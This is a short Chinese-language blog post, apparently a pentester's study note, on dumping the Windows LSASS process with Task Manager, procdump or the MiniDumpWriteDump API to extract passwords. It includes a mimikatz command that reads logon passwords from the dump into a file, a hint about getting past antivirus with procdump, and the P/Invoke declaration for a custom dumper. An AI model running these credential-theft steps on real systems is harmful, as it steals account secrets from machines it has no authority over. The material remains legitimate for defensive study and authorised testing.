---
layout: post
title: MiniDumpWriteDump
---



## 0x01

常见内网渗透会经常遇到抓取windows密码的场景，本文用来学习使用内存转储的方式来获取windows密码。

## 0x02

我们可以将转储LSASS的进程内存。Windows允许我们创建转储文件，它是给定进程的快照。此转储包括加载的库和应用程序内存。

在任务管理器中直接转储就可以，他将会生成一个dmp的文件，然后拿回本地用Minikatz解密即可。



![img](https://gitee.com/a4m1n/tuchuang/raw/master/pic/clipboard.png)

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > password.txt
```

这样做的缺点是需要图形化界面，需要登录到管理员桌面，然后操作，渗透中常用的方法有sqldump,procdump,不过Procdump在遇到某些AV时候会被拦截，不过选择要procdump的pid来转储时也可以达到Bypass的效果

## 0x03

其实不难发现，Procdump和任务管理器的这两种方法都是使用了MiniDumpWriteDump的API

```
BOOL MiniDumpWriteDump(
  HANDLE                            hProcess,      //获取 LSASS的句柄
  DWORD                             ProcessId,     //获取 LSASS的进程ID号
  HANDLE                            hFile,		   //要写入信息的文件句柄
  MINIDUMP_TYPE                     DumpType,      //要生成的信息类型
  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,  //指向MINIDUMP_EXCEPTION_INFORMATION 结构的指针
  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,  //指向MINIDUMP_USER_STREAM_INFORMATION 结构的指针 
  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam   //指向MINIDUMP_CALLBACK_INFORMATION 结构的指针
);
```

其实并不需要全部的api，使用前面4个即可，然后看下需要的Import

![image-20210811173030733](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811173030733.png)

```
static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam,IntPtr UserStreamParam, IntPtr CallbackParam);
```

